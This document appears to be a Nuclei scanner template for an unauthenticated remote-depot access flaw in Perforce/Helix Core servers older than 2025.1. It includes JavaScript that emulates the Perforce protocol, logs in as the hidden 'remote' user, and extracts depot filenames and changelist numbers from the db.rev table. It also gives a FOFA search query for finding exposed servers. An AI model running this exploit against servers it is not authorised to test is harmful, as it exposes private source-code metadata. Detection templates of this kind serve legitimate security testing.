flow: tcp(1) && javascript(1)
id: perforce-remote-depot-unauth
info:
  author: Morgan Robertson
  classification:
    cpe: 'cpe:2.3:a:perforce:perforce_server:*:*:*:*:*:*:*:* versions up to (excluding)
      2025.1

      cpe:2.3:a:perforce:helix_core:*:*:*:*:*:*:* versions up to (excluding) 2025.1

      '
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-306
  description: 'This template checks for remote depot access via the default, hidden
    "remote" user. This is available in server versions below 2025.1 and when the
    security level is below 4 (default security level is 0). This template will not
    work on servers that enforce SSL. This template works on both ASCII and unicode
    servers by sending an ASCII compatible request and if that fails, a unicode compatible
    request. This template emulates the perforce binary protocol and extracts filenames
    & change list number.

    '
  metadata:
    fofa-query: port="1666" && protocol="unknown"
    max-requests: 3
    product: P4 (FKA "Helix Core", FKA "Perforce")
    vendor: perforce
  name: Perforce Unauthenticated Remote Depot Access
  reference:
  - https://morganrobertson.net/p4wned/
  - https://www.keysight.com/blogs/en/tech/nwvs/2022/06/08/a-sneak-peek-into-the-protocol-behind-perforce
  - https://help.perforce.com/helix-core/release-notes/current/relnotes.txt
  remediation: 'Set security=4 to disable the built-in "remote" user.

    This is fixed by default in Perforce 2025.1+.

    '
  severity: high
  tags: perforce,helixcore,scm,unauth,rpc,default-login
javascript:
- args:
    Host: '{{Host}}'
    Port: '1666'
  code: "var net = require(\"nuclei/net\");\n\n// --- HEX HELPERS ---\nfunction strToHex(str)\
    \ {\n    var hex = \"\";\n    for (var i = 0; i < str.length; i++) {\n       \
    \ var h = str.charCodeAt(i).toString(16);\n        if (h.length < 2) h = \"0\"\
    \ + h;\n        hex += h;\n    }\n    return hex;\n}\n\nfunction numToHexLE(num)\
    \ {\n    var b1 = (num & 0xFF), b2 = ((num >> 8) & 0xFF), b3 = ((num >> 16) &\
    \ 0xFF), b4 = ((num >> 24) & 0xFF);\n    return [b1, b2, b3, b4].map(function(b)\
    \ {\n        var s = b.toString(16);\n        return (s.length < 2 ? \"0\" + s\
    \ : s);\n    }).join(\"\");\n}\n\n// Standard Pack Param (String Value)\nfunction\
    \ packParamHex(name, value) {\n    return strToHex(name) + \"00\" + numToHexLE(value.length)\
    \ + strToHex(value) + \"00\";\n}\n\n// Binary Pack Param (Hex Value)\n// Used\
    \ for passing pre-constructed binary payloads like keyVal\nfunction packParamHexFromHex(name,\
    \ valueHex) {\n    var len = valueHex.length / 2;\n    return strToHex(name) +\
    \ \"00\" + numToHexLE(len) + valueHex + \"00\";\n}\n\nfunction buildPacketHex(params)\
    \ {\n    var payloadHex = \"\";\n    for (var i = 0; i < params.length; i++) {\n\
    \        var p = params[i];\n        // If 3rd arg is true, value is already HEX\n\
    \        if (p.length === 3 && p[2] === true) {\n             payloadHex += packParamHexFromHex(p[0],\
    \ p[1]);\n        } else {\n             payloadHex += packParamHex(p[0], p[1]);\n\
    \        }\n    }\n    var totalLen = payloadHex.length / 2;\n    var lenLow =\
    \ totalLen & 0xFF;\n    var lenHigh = (totalLen >> 8) & 0xFF;\n    var xor = lenLow\
    \ ^ lenHigh;\n    var headerHex = [xor, lenLow, lenHigh, 0, 0].map(function(b)\
    \ {\n        var s = b.toString(16); return (s.length < 2 ? \"0\" + s : s);\n\
    \    }).join(\"\");\n\n    return headerHex + payloadHex;\n}\n\n// --- PARSERS\
    \ ---\n\n// Parses raw response into Key-Value pairs\nfunction parsePerforceResponse(dataStr)\
    \ {\n    var offset = 0;\n    var results = [];\n    while (offset < dataStr.length)\
    \ {\n        if (offset + 5 > dataStr.length) break;\n        var lenLow = dataStr.charCodeAt(offset\
    \ + 1);\n        var lenHigh = dataStr.charCodeAt(offset + 2);\n        var bodyLen\
    \ = lenLow | (lenHigh << 8);\n        var totalPacketSize = 5 + bodyLen;\n   \
    \     if (offset + totalPacketSize > dataStr.length) break;\n\n        var body\
    \ = dataStr.substring(offset + 5, offset + totalPacketSize);\n        var packetObj\
    \ = {};\n        var bodyOffset = 0;\n\n        while (bodyOffset < body.length)\
    \ {\n            var nameEnd = body.indexOf('\\u0000', bodyOffset);\n        \
    \    if (nameEnd === -1) break;\n            var key = body.substring(bodyOffset,\
    \ nameEnd);\n            bodyOffset = nameEnd + 1;\n\n            if (bodyOffset\
    \ + 4 > body.length) break;\n            var v0 = body.charCodeAt(bodyOffset);\n\
    \            var v1 = body.charCodeAt(bodyOffset + 1);\n            var v2 = body.charCodeAt(bodyOffset\
    \ + 2);\n            var v3 = body.charCodeAt(bodyOffset + 3);\n            var\
    \ valLen = (v0 | (v1 << 8) | (v2 << 16) | (v3 << 24)) >>> 0;\n            bodyOffset\
    \ += 4;\n\n            if (bodyOffset + valLen > body.length) break;\n       \
    \     var value = body.substring(bodyOffset, bodyOffset + valLen);\n         \
    \   packetObj[key] = value;\n            bodyOffset += valLen + 1;\n        }\n\
    \        results.push(packetObj);\n        offset += totalPacketSize;\n    }\n\
    \    return results;\n}\n\n// Decodes the binary 'data' blob from db.rev table\n\
    function decodeDbRev(bufferStr) {\n    var offset = 0;\n    var records = [];\n\
    \n    // Internal helper to read uint32\n    function readUInt32() {\n       \
    \ if (offset + 4 > bufferStr.length) return -1;\n        var v = bufferStr.charCodeAt(offset)\
    \ |\n                (bufferStr.charCodeAt(offset+1) << 8) |\n               \
    \ (bufferStr.charCodeAt(offset+2) << 16) |\n                (bufferStr.charCodeAt(offset+3)\
    \ << 24);\n        offset += 4;\n        return v >>> 0;\n    }\n\n    // Internal\
    \ helper to read string\n    function readString() {\n        var len = readUInt32();\n\
    \        if (len === -1 || offset + len > bufferStr.length) return null;\n   \
    \     var s = bufferStr.substring(offset, offset + len);\n        offset += len;\n\
    \        return s;\n    }\n\n    while (offset < bufferStr.length) {\n       \
    \ var depotFile = readString();\n        if (depotFile === null) break;\n\n  \
    \      var rev = readUInt32();\n        var type = readUInt32();\n        var\
    \ action = readUInt32();\n        var change = readUInt32();\n        var date\
    \ = readUInt32();\n        var modTime = readUInt32();\n\n        // Digest (16\
    \ bytes) + Size (8 bytes) + Trait (4) + Unknown (4) = 32 bytes\n        if (offset\
    \ + 32 > bufferStr.length) break;\n        offset += 32;\n\n        var lazyFile\
    \ = readString();\n        var revStr = readString();\n        var typeStr = readString();\n\
    \n        records.push({\n            \"depotFile\": depotFile,\n            \"\
    rev\": rev,\n            \"change\": change,\n            \"action\": action,\n\
    \            \"date\": new Date(date * 1000).toISOString().split('T')[0]\n   \
    \     });\n    }\n    return records;\n}\n\n// --- LOGIC: Try Remote Access ---\n\
    function accessRemote(host, port, useUnicode) {\n    var address = host + \":\"\
    \ + port;\n\n    // 1. Construct keyVal Hex Buffer (42 bytes)\n    // 0-3: 02\
    \ 00 00 00 (Int 2)\n    // 4-5: 2f 2f (//)\n    // 6-9: ff ff ff 7f (Int Max 2147483647)\n\
    \    // 10-41: Zeroes\n    var keyValHex = \"02000000\" + \"2f2f\" + \"ffffff7f\"\
    ;\n    // Add 32 bytes of zeroes (64 hex chars)\n    for (var k = 0; k < 32; k++)\
    \ keyValHex += \"00\";\n\n    // Packet 1: Protocol Handshake for server to server\
    \ communication\n    var p1 = [\n        [\"serverID\", \"\"],\n        [\"cmdIdent\"\
    , \"4139E823 20EDF233 3D743292 62DFA422\"],\n        [\"client\", \"97\"],\n \
    \       [\"sndbuf\", \"1969919\"],\n        [\"rcvbuf\", \"98304\"],\n       \
    \ [\"autoTune\", \"1\"],\n        [\"func\", \"protocol\"]\n    ];\n\n    // Packet\
    \ 2: rmt-DbPipe Command\n    var p2 = [\n        [\"keyVal\", keyValHex, true],\
    \ // true indicates value is already HEX\n        [\"os\", \"UNIX\"],\n      \
    \  [\"cwd\", \"\"],\n        [\"client\", \"\"],\n        [\"table\", \"db.rev\"\
    ],\n        [\"confirm\", \"dmr-DbPipe\"],\n        [\"version\", \"10\"],\n \
    \       [\"remoteRange\", \"1\"],\n        [\"remoteMap0\", \"//...\"],\n    \
    \    [\"user\", \"remote\"]\n    ];\n\n    if (useUnicode) {\n        p2.push([\"\
    unicode\", \"\"]);\n    }\n\n    p2.push([\"func\", \"rmt-DbPipe\"]);\n\n    var\
    \ p3 = [[\"func\", \"release\"]];\n\n    var payloadHex = buildPacketHex(p1) +\
    \ buildPacketHex(p2);\n    var releaseHex = buildPacketHex(p3);\n    var rawBuffer\
    \ = \"\";\n\n    try {\n        var conn = net.Open(\"tcp\", address);\n     \
    \   conn.SendHex(payloadHex);\n        conn.SetTimeout(5);\n\n        // Read\
    \ Loop\n        for (var loop = 0; loop < 20; loop++) {\n            try {\n \
    \               var bytes = conn.Recv(4096);\n                if (bytes && bytes.length\
    \ > 0) {\n                    for (var i = 0; i < bytes.length; i++) {\n     \
    \                   rawBuffer += String.fromCharCode(bytes[i]);\n            \
    \        }\n                    if (rawBuffer.indexOf('func\\u0000\\u0007\\u0000\\\
    u0000\\u0000release\\u0000') !== -1) {\n                        break;\n     \
    \               }\n                } else {\n                    break;\n    \
    \            }\n            } catch (e) { break; }\n        }\n        try { conn.SendHex(releaseHex);\
    \ } catch(e) {}\n        conn.Close();\n    } catch (e) { return []; }\n\n   \
    \ // Parse & Extract\n    var packets = parsePerforceResponse(rawBuffer);\n  \
    \  var extractedFiles = [];\n\n    for (var i = 0; i < packets.length; i++) {\n\
    \        var pkt = packets[i];\n        // Check for DB Pipe response with data\n\
    \        if (pkt['func'] === 'dmr-DbPipe' && pkt['data']) {\n            var records\
    \ = decodeDbRev(pkt['data']);\n            for (var r = 0; r < records.length;\
    \ r++) {\n                extractedFiles.push(records[r]);\n            }\n  \
    \      }\n    }\n    return extractedFiles;\n}\n\n// --- EXECUTION ---\n// 1.\
    \ Try ASCII\nvar files = accessRemote(Host, Port, false);\n\n// 2. If empty, try\
    \ Unicode\nif (files.length === 0) {\n    files = accessRemote(Host, Port, true);\n\
    }\n\nJSON.stringify(files);\n"
  extractors:
  - json:
    - .[].depotFile
    name: depot_files
    type: json
  - json:
    - .[].change
    name: changes
    type: json
tcp:
- host:
  - '{{Host}}:1666'
  inputs:
  - data: 
    type: hex
  matchers:
  - condition: and
    encoding: hex
    internal: true
    part: data
    type: word
    words:
    - xfiles
    - server
  read-size: 4096
